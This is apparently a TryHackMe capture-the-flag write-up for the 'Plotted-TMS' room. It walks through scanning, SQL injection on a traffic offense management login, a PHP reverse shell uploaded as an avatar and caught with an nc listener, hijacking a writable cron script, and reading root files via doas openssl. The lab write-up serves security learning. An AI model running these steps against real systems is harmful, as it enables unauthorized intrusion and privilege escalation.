## Plotted-TMS 

Room link: https://tryhackme.com/room/plottedtms

# Scanning 
I ran an aggressive NMAP scan with ```-A``` option. 
```
ajread@aj-ubuntu:~/TryHackMe$ nmap -A [Remote IP]
Starting Nmap 7.80 ( https://nmap.org ) at 2022-04-05 19:32 EDT
Nmap scan report for [Remote IP]
Host is up (0.11s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
445/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 83.43 seconds
```
A full nmap scan affirmed the services on the target. 
```
ajread@aj-ubuntu:~$ nmap -p- [Remote IP]
Starting Nmap 7.80 ( https://nmap.org ) at 2022-04-05 19:31 EDT
Nmap scan report for [Remote IP]
Host is up (0.10s latency).
Not shown: 65532 closed ports
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
445/tcp open  microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 708.46 seconds
```
# Enumeration
```
ajread@aj-ubuntu:~$ gobuster -u http://[Remote IP] -w /home/ajread/resources/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt 

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://[Remote IP]/
[+] Threads      : 10
[+] Wordlist     : /home/ajread/resources/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
2022/04/05 20:11:29 Starting gobuster
=====================================================
/admin (Status: 301)
/shadow (Status: 200)
/passwd (Status: 200)
=====================================================
2022/04/05 20:29:50 Finished
=====================================================
```
```
ajread@aj-ubuntu:~$ gobuster -u http://[Remote IP]:445 -w /home/ajread/resources/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt 

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://[Remote IP]:445/
[+] Threads      : 10
[+] Wordlist     : /home/ajread/resources/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
2022/04/05 20:11:31 Starting gobuster
=====================================================
/management (Status: 301)
=====================================================
2022/04/05 20:29:50 Finished
=====================================================
```
# Initial Access
After doing some research online, it appeared that Traffic Offense Management system is susceptible to SQL injection or RCE (```https://www.exploit-db.com/exploits/50221```). First checking on SQL injection, I attempted to login with ```test:test``` and found that the response from the server contained SQL queries. 
```
{
  "status": "incorrect",
  "last_qry": "SELECT * from users where username = 'test' and password = md5('test') "
}
```
I found an exploit online that was listed as RCE and I used the username:password combination in the exploit to login to the TMS. Reading through the same exploit, I could upload anything on the ```admin/?page=user``` page, which is used to create a new user, as the user avatar. Therefore, I created a php reverse shell using pentest monkey to upload in the avatar section. 

Before uploading, I set up a listener on my local machine. 
```
ajread@aj-ubuntu:~$ nc -lnvp 9999
```
Finally, I uploaded the php reverse shell at ```http://[Remote IP]:445/management/admin/?page=user``` on the TMS and it called back! 
```
ajread@aj-ubuntu:~$ nc -lnvp 9999
Listening on 0.0.0.0 9999
Connection received on [Remote IP] 59404
Linux plotted 5.4.0-89-generic #100-Ubuntu SMP Fri Sep 24 14:50:10 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
 23:56:52 up 27 min,  0 users,  load average: 5.87, 3.24, 1.97
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
I made sure to upgrade my shell. 
```
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@plotted:/home/plot_admin$ 
```
In order to see user.txt, I had to become the plot_admin user. It appeared that a backup shell script (called ```backup.sh```) ran periodically as user plot_admin on the system when I looked at the cronjobs. I needed to find a way to have that same mechanism execute my own shell script as user plot_admin. I found out that I have write access to the ```/var/www/scripts``` directory, where the shell script sat. I was lost for a while, so I used infinity's write up here: ```https://wiki.thehacker.nz/docs/thm-writeups/plotted-tms-easy/``` to help me figure out a way to link a shell script that would execute ```/bin/bash``` to the ```backup.sh``` shell script. 

As a result, I escalated to user plot_admin. 
```
www-data@plotted:/$ /home/plot_admin/pa_shell -p
/home/plot_admin/pa_shell -p
pa_shell-5.0$ id
id
uid=33(www-data) gid=33(www-data) euid=1001(plot_admin) egid=1001(plot_admin) groups=1001(plot_admin),33(www-data)
pa_shell-5.0$ whoami
whoami
plot_admin
```
And got the user flag. 
```
pa_shell-5.0$ wc -c /home/plot_admin/user.txt
wc -c /home/plot_admin/user.txt
33 /home/plot_admin/user.txt
```
# Privilege Escalation 
I added my public ssh key as an authorized key on the target machine so that I was able to ssh into the target. 
```
ajread@aj-ubuntu:~$ ssh plot_admin@[Remote IP]
```
Looking around for possible privilege escalation techniques, it appeared that user plot_admin could run openssl as root without a password. 
```
plot_admin@plotted:~/tms_backup$ cat /etc/doas.conf
permit nopass plot_admin as root cmd openssl
```
I checked out the GTFOBins website to see if I could use openssl for priv esc (https://gtfobins.github.io/gtfobins/openssl/). It looked like I could with: 
```
LFILE=file_to_read
openssl enc -in "$LFILE"
```
Combining the information I found, I tried to read the flag within the root home directory. And it worked! 
```
plot_admin@plotted:~/tms_backup$ doas openssl enc -in "/root/root.txt"
Congratulations on completing this room!

[REDACTED]

Hope you enjoyed the journey!

Do let me know if you have any ideas/suggestions for future rooms.
-sa.infinity8888
```

# Assistance 

Done with help from: https://wiki.thehacker.nz/docs/thm-writeups/plotted-tms-easy/